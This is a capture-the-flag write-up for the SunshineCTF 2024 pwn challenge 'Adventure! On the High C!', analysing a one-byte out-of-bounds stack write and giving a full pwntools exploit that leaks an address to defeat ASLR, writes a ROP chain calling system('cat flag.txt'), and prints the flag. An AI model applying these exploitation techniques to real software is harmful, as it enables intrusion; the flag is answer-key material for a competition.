https://ctftime.org/event/2485

# Adventure! On the High C! (pwn)

Set sail on a perilous journey through treacherous C waters, where misplaced cannons are the least of your concerns. Your mission? Board the “Adventure on the High C!” and lay siege to your enemies. Navigate your way through the fog of pointers, but beware: one wrong move, and you might just blow a hole in your own stack!

Competitors are encouraged to develop their exploit in the Docker Container (uncomment the lines in the Dockerfile if youd like to build a development container with pwntools, pwndbg, and gdb.)

nc 2024.sunshinectf.games 24003

## Analysis

`main` @ `0x?`
- The game has well-telegraphed-bug that allows you to perform a 1 byte write outside the bounds of the board memory
    - The board is stored on the stack and so this write is relative to the stack
- The address to write is computed like this `local_218[(long)row + (long)column * 0x10] = local_219;`
    - This means that if we supply `0` for `column` we can simply provide a linear offset from the stack with the value of `row`
- `0x1681` writes the byte we supply to the address we chose
- Helpfully this bug also reports the value of the byte that existed in memory prior to the write
    - This allows us to read bytes from the stack if we know their offset at the time the read is performed

`cat flag.txt\x00` @ `0x2a1c`
- As a part of the ASCII art we have a few useful strings
- `cat flag.txt\x00` works well with `/bin/sh`

## Solution

1) Use the out of bounds access to the game board to construct read/write primitives
2) Read an address at offset `-24`, namely `0x15e3`, from the stack to bypass ASLR on the main image
3) Write a ropchain to stack starting at the return address which is at offset `0x218`
4) End the game early passing control of `rip` to the ropchain by writing to the byte checked in the while loop at offset `0x20c`

```python
#!/usr/bin/env python3

from pwn import *

# note: this exploit needs to be run a few times on the remote

#context.log_level = "debug"
elf = ELF("./ship.bin", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("2024.sunshinectf.games", 24003)

def read8(where):
    what = 0
    for i in range(8):
        p.sendlineafter(b"Enter the row (0-9, a-f) >>> ", str(0).encode())
        p.sendlineafter(b"Enter the column (0-9, a-f) >>> ", str(where + i).encode())
        p.sendlineafter(b"Custom (C) >>> ", b"A")
        p.readuntil(b"Fired outside board, corrupting")
        what |= int(p.readline().decode().split(" ")[3], 16) << (8 * i)
    return what

def writeN(where, what):
    for i in range(len(what)):
        p.sendlineafter(b"Enter the row (0-9, a-f) >>> ", str(0).encode())
        p.sendlineafter(b"Enter the column (0-9, a-f) >>> ", str(where + i).encode())
        p.sendlineafter(b"Custom (C) >>> ", p8(what[i]))
        p.readuntil(b"Fired outside board, corrupting")

leak = read8(-24)
base = leak - 0x15e3
log.success(f"base: {hex(base)}") # bypass aslr

RET_ADDR_OFFSET = 0x218
POP_RDI = 0x1754 + base
CAT_FLAG_DOT_TXT = 0x2a1c + base
CALL_SYSTEM = 0x1760 + base

payload = b""
payload += p64(POP_RDI)
payload += p64(CAT_FLAG_DOT_TXT)
payload += p64(CALL_SYSTEM)
writeN(RET_ADDR_OFFSET, payload) # system("cat flag.txt")

KEEP_GOING_OFFSET = 0x20c
writeN(KEEP_GOING_OFFSET, p8(1)) # end the game early
p.readuntil(b"!")

p.interactive() # sun{v1ct0RY_on_Th3_High_s34}
```

## Flag
`sun{v1ct0RY_on_Th3_High_s34}`

smiley 2024/10/20
